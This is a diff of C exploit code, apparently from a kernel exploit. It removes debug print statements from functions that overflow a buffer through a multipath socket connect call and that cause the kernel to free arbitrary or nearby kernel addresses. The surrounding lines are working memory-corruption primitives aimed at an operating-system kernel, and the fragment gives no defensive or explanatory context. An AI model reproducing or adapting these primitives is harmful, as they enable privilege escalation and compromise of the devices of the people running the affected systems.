@@ -9,7 +9,6 @@
 
 #include <netinet/in.h>
 #include <sys/socket.h>
-#include <stdio.h>
 #include <stdint.h>
 #include <stdlib.h>
 #include <string.h>
@@ -37,7 +36,6 @@ struct not_todescos_not_essers_ipc_object
 
 static void _multipath_connectx_overflow(int sock, void *buf, size_t n)
 {
-    printf("Performing overflow in multipath connection...\n");
     struct sockaddr_in *sa_dst = calloc(1, 0x4000);
     memset(sa_dst, 0x0, 0x4000);
     memcpy(sa_dst, buf, n);
@@ -96,15 +94,13 @@ static void _multipath_kfree(int sock, uint64_t addr, size_t addr_size)
 /* multipath_kfree: cause GC to free a kernel address. */
 void multipath_kfree(uint64_t addr)
 {
-    printf("Freeing kernel memory at address %#llx...\n", addr);
     int mp_sock = socket(AF_MULTIPATH, SOCK_STREAM, 0);
     _multipath_kfree(mp_sock, addr, sizeof(addr));
 }
 
 /* multipath_kfree_nearby_self: cause GC to free a "nearby" kernel address.
-   NOTE: closes mp_sock */
+ NOTE: closes mp_sock */
 void multipath_kfree_nearby_self(int mp_sock, uint16_t addr_lowest_part)
 {
-    printf("Freeing kernel memory at a nearby address starting from: %#hx\n", addr_lowest_part);
-   _multipath_kfree(mp_sock, addr_lowest_part, sizeof(addr_lowest_part));
+    _multipath_kfree(mp_sock, addr_lowest_part, sizeof(addr_lowest_part));
 }
